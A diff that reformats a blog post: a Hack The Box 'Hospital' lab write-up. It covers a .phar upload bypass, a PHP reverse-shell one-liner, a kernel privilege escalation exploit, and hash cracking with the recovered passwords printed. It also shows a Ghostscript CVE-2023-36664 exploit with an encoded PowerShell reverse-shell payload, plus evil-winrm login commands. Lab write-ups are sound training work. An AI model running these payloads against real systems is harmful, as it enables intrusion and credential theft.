@@ -1,1 +1,187 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as www-data</u></strong></span></p><p>&nbsp;</p><p>Port 8080 is a webpage with a login page. We can see admin is taken with 6 characters minimum for the password.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:534/394;" src="../img/posts/2024-10-20-Hospital(HTB)/01-c8e8fba47d.png" width="534" height="394"></figure><p>&nbsp;</p><p>Port 443 is a webpage as well with a login</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:540/466;" src="../img/posts/2024-10-20-Hospital(HTB)/02-9156f9e2fe.png" width="540" height="466"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Logo points to roundcube webmail</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:777/310;" src="../img/posts/2024-10-20-Hospital(HTB)/03-c57c096d04.png" width="777" height="310"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can create an account and login and upload files</p><p>http://10.10.11.241:8080/index.php</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:815/411;" src="../img/posts/2024-10-20-Hospital(HTB)/04-dca2fac6e4.png" width="815" height="411"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Fuzzing the uploads shows us a bunch of php files can be uploaded but only .phar files render the code. We can see this by the response.</p><p>&nbsp;</p><p>renders php code as we dont see it in the response</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1743/655;" src="../img/posts/2024-10-20-Hospital(HTB)/05-b5203d9c90.png" width="1743" height="655"></figure><p>&nbsp;</p><p>php code rendered in response so its not being executed</p><figure class="image"><img style="aspect-ratio:1719/460;" src="../img/posts/2024-10-20-Hospital(HTB)/06-731358a1ba.png" width="1719" height="460"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I tried for quite a while to get a shell but nothing was working. Eventually I saw an error that said “powershell not found” and I realized the website is running on a linux machine, probably in docker. I then uploaded a webshell where we can get a reverse shell using a php one liner.</p><p>&nbsp;</p><p><code>php -r '$sock=fsockopen("10.10.14.4",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1025/295;" src="../img/posts/2024-10-20-Hospital(HTB)/07-8ebf527d20.png" width="1025" height="295"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:524/167;" src="../img/posts/2024-10-20-Hospital(HTB)/08-ca5f0fcc91.png" width="524" height="167"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Using linpeas we can get creds for the mysql database</p><p>/var/www/html/config.php:define('DB_PASSWORD', 'my$qls3rv1c3!');<br>/var/www/html/config.php:define('DB_USERNAME', 'root');</p><p>root:my$qls3rv1c3!</p><p>&nbsp;</p><p>Dumping users table</p><p>| id | username | password &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | created_at &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br>+----+----------+--------------------------------------------------------------+---------------------+<br>| &nbsp;1 | admin &nbsp; &nbsp;| $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |<br>| &nbsp;2 | patient &nbsp;| $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |<br>| &nbsp;3 | test &nbsp; &nbsp; | $2y$10$AAGf0EuNrVSWiwVxaotTau97A63yqbLtFMDg0CvHcvPLSfIghFTUy | 2024-10-17 09:35:31&nbsp;</p><p><br>Cracked hashes</p><p>admin:123456<br>patient:patient</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Host is using an outdated kernel and we can priv esc using</p><p>https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:485/197;" src="../img/posts/2024-10-20-Hospital(HTB)/09-5535bfd3c7.png" width="485" height="197"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Now that we are root we can copy the /etc/passwd and /etc/shadow file and crack the password for drwilliams</p><p>&nbsp;</p><p><code>echo 'drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash' &gt; drwilliams_passwd</code></p><p><code>echo 'drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::' &gt; drwilliams_shadow</code></p><p><code>unshadow drwilliams_passwd drwilliams_shadow &gt; drwilliams_unshadowed.txt</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:806/219;" src="../img/posts/2024-10-20-Hospital(HTB)/10-14d941c4cd.png" width="806" height="219"></figure><p>&nbsp;</p><p>drwilliams:qwe123!@#</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong>Shell as drbrown</strong></span></p><p>&nbsp;</p><p>We can now login to the webmail</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1308/525;" src="../img/posts/2024-10-20-Hospital(HTB)/11-aa8a09daf6.png" width="1308" height="525"></figure><p>&nbsp;</p><p>The only thing here is an email referencing an eps file and ghost script</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:744/434;" src="../img/posts/2024-10-20-Hospital(HTB)/12-1088fbf40a.png" width="744" height="434"></figure><p>&nbsp;</p><p>We can find a CVE which has RCE</p><p>https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</p><p>&nbsp;</p><p>It took me a million payloads but I eventually got a working on</p><p><code>python CVE_2023_36664_exploit.py --generate --filename needle --extension eps --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</code></p><p>&nbsp;</p><p>&nbsp;</p><p>Sending the email</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2554/711;" src="../img/posts/2024-10-20-Hospital(HTB)/13-431adae414.png" width="2554" height="711"></figure><p>&nbsp;</p><p>&nbsp;</p><p>shell as drbrown</p><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:1270/587;" src="../img/posts/2024-10-20-Hospital(HTB)/14-d6949cbd73.png" width="1270" height="587"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Inside of the ghostscript.bat file we have the password for drbrown</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:928/148;" src="../img/posts/2024-10-20-Hospital(HTB)/15-d14ee0b38a.png" width="928" height="148"></figure><p>drbrown:chr!$br0wn</p><p>&nbsp;</p><p>We can now remote in with evil-winrm</p><p>evil-winrm -i 10.10.11.241 -u drbrown -p 'chr!$br0wn'</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong>Shell as System</strong></span></p><p>&nbsp;</p><p>Couldnt figure out the priv esc without a hint. Looks like we were supposed to guess roundcube was running as system and upload a web shell. Spent many many hours on this and still not sure how we were supposed to figure this out. I will watch ippsecs video to see how he explains it.</p><p>&nbsp;</p><p>&nbsp;</p><p>Its running in xampp\htdocs</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:554/166;" src="../img/posts/2024-10-20-Hospital(HTB)/16-7b4d112c7a.png" width="554" height="166"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:820/281;" src="../img/posts/2024-10-20-Hospital(HTB)/17-ec21561c38.png" width="820" height="281"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:898/244;" src="../img/posts/2024-10-20-Hospital(HTB)/18-cfdd79aa63.png" width="898" height="244"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:693/633;" src="../img/posts/2024-10-20-Hospital(HTB)/19-059daa380d.png" width="693" height="633"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Hospital | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-10-20-Hospital(HTB)/01-c8e8fba47d.png" alt="HTB: Hospital cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Hospital</h1>
+                <div class="post-meta">October 20, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Shell as www-data</h1>
+
+        <p>Port 8080 is a webpage with a login page. We can see admin is taken with 6 characters minimum for the password.</p>
+
+        <img alt="Screenshot 1" height="394" src="../img/posts/2024-10-20-Hospital(HTB)/01-c8e8fba47d.png" style="aspect-ratio:534/394;" width="534"/>
+
+        <p>Port 443 is a webpage as well with a login</p>
+
+        <img alt="Screenshot 2" height="466" src="../img/posts/2024-10-20-Hospital(HTB)/02-9156f9e2fe.png" style="aspect-ratio:540/466;" width="540"/>
+
+        <p>Logo points to roundcube webmail</p>
+
+        <img alt="Screenshot 3" height="310" src="../img/posts/2024-10-20-Hospital(HTB)/03-c57c096d04.png" style="aspect-ratio:777/310;" width="777"/>
+
+        <p>We can create an account and login and upload files</p>
+
+        <p>http://10.10.11.241:8080/index.php</p>
+
+        <img alt="Screenshot 4" height="411" src="../img/posts/2024-10-20-Hospital(HTB)/04-dca2fac6e4.png" style="aspect-ratio:815/411;" width="815"/>
+
+        <p>Fuzzing the uploads shows us a bunch of php files can be uploaded but only .phar files render the code. We can see this by the response.</p>
+
+        <p>renders php code as we dont see it in the response</p>
+
+        <img alt="Screenshot 5" height="655" src="../img/posts/2024-10-20-Hospital(HTB)/05-b5203d9c90.png" style="aspect-ratio:1743/655;" width="1743"/>
+
+        <p>php code rendered in response so its not being executed</p>
+
+        <img alt="Screenshot 6" height="460" src="../img/posts/2024-10-20-Hospital(HTB)/06-731358a1ba.png" style="aspect-ratio:1719/460;" width="1719"/>
+
+        <p>I tried for quite a while to get a shell but nothing was working. Eventually I saw an error that said “powershell not found” and I realized the website is running on a linux machine, probably in docker. I then uploaded a webshell where we can get a reverse shell using a php one liner.</p>
+
+        <pre class="terminal"><code>php -r '$sock=fsockopen("10.10.14.4",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
+
+        <img alt="Screenshot 7" height="295" src="../img/posts/2024-10-20-Hospital(HTB)/07-8ebf527d20.png" style="aspect-ratio:1025/295;" width="1025"/>
+
+        <img alt="Screenshot 8" height="167" src="../img/posts/2024-10-20-Hospital(HTB)/08-ca5f0fcc91.png" style="aspect-ratio:524/167;" width="524"/>
+
+        <p>Using linpeas we can get creds for the mysql database</p>
+
+        <p>/var/www/html/config.php:define('DB_PASSWORD', 'my$qls3rv1c3!');<br/>/var/www/html/config.php:define('DB_USERNAME', 'root');</p>
+
+        <p>root:my$qls3rv1c3!</p>
+
+        <p>Dumping users table</p>
+
+        <p>| id | username | password                                                     | created_at          |<br/>+----+----------+--------------------------------------------------------------+---------------------+<br/>|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |<br/>|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |<br/>|  3 | test     | $2y$10$AAGf0EuNrVSWiwVxaotTau97A63yqbLtFMDg0CvHcvPLSfIghFTUy | 2024-10-17 09:35:31 </p>
+
+        <p><br/>Cracked hashes</p>
+
+        <p>admin:123456<br/>patient:patient</p>
+
+        <p>Host is using an outdated kernel and we can priv esc using</p>
+
+        <p>https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh</p>
+
+        <img alt="Screenshot 9" height="197" src="../img/posts/2024-10-20-Hospital(HTB)/09-5535bfd3c7.png" style="aspect-ratio:485/197;" width="485"/>
+
+        <p>Now that we are root we can copy the /etc/passwd and /etc/shadow file and crack the password for drwilliams</p>
+
+        <pre class="terminal"><code>echo 'drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash' &gt; drwilliams_passwd</code></pre>
+
+        <pre class="terminal"><code>echo 'drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::' &gt; drwilliams_shadow</code></pre>
+
+        <pre class="terminal"><code>unshadow drwilliams_passwd drwilliams_shadow &gt; drwilliams_unshadowed.txt</code></pre>
+
+        <img alt="Screenshot 10" height="219" src="../img/posts/2024-10-20-Hospital(HTB)/10-14d941c4cd.png" style="aspect-ratio:806/219;" width="806"/>
+
+        <p>drwilliams:qwe123!@#</p>
+
+        <h1 style="color:red;">Shell as drbrown</h1>
+
+        <p>We can now login to the webmail</p>
+
+        <img alt="Screenshot 11" height="525" src="../img/posts/2024-10-20-Hospital(HTB)/11-aa8a09daf6.png" style="aspect-ratio:1308/525;" width="1308"/>
+
+        <p>The only thing here is an email referencing an eps file and ghost script</p>
+
+        <img alt="Screenshot 12" height="434" src="../img/posts/2024-10-20-Hospital(HTB)/12-1088fbf40a.png" style="aspect-ratio:744/434;" width="744"/>
+
+        <p>We can find a CVE which has RCE</p>
+
+        <p>https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</p>
+
+        <p>It took me a million payloads but I eventually got a working on</p>
+
+        <pre class="terminal"><code>python CVE_2023_36664_exploit.py --generate --filename needle --extension eps --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</code></pre>
+
+        <p>Sending the email</p>
+
+        <img alt="Screenshot 13" height="711" src="../img/posts/2024-10-20-Hospital(HTB)/13-431adae414.png" style="aspect-ratio:2554/711;" width="2554"/>
+
+        <p>shell as drbrown</p>
+
+        <img alt="Screenshot 14" height="587" src="../img/posts/2024-10-20-Hospital(HTB)/14-d6949cbd73.png" style="aspect-ratio:1270/587;" width="1270"/>
+
+        <p>Inside of the ghostscript.bat file we have the password for drbrown</p>
+
+        <img alt="Screenshot 15" height="148" src="../img/posts/2024-10-20-Hospital(HTB)/15-d14ee0b38a.png" style="aspect-ratio:928/148;" width="928"/>
+
+        <p>drbrown:chr!$br0wn</p>
+
+        <p>We can now remote in with evil-winrm</p>
+
+        <p>evil-winrm -i 10.10.11.241 -u drbrown -p 'chr!$br0wn'</p>
+
+        <h1 style="color:red;">Shell as System</h1>
+
+        <p>Couldnt figure out the priv esc without a hint. Looks like we were supposed to guess roundcube was running as system and upload a web shell. Spent many many hours on this and still not sure how we were supposed to figure this out. I will watch ippsecs video to see how he explains it.</p>
+
+        <p>Its running in xampp\htdocs</p>
+
+        <img alt="Screenshot 16" height="166" src="../img/posts/2024-10-20-Hospital(HTB)/16-7b4d112c7a.png" style="aspect-ratio:554/166;" width="554"/>
+
+        <img alt="Screenshot 17" height="281" src="../img/posts/2024-10-20-Hospital(HTB)/17-ec21561c38.png" style="aspect-ratio:820/281;" width="820"/>
+
+        <img alt="Screenshot 18" height="244" src="../img/posts/2024-10-20-Hospital(HTB)/18-cfdd79aa63.png" style="aspect-ratio:898/244;" width="898"/>
+
+        <img alt="Screenshot 19" height="633" src="../img/posts/2024-10-20-Hospital(HTB)/19-059daa380d.png" style="aspect-ratio:693/633;" width="693"/>
+    </article>
+
+</body>
+</html>
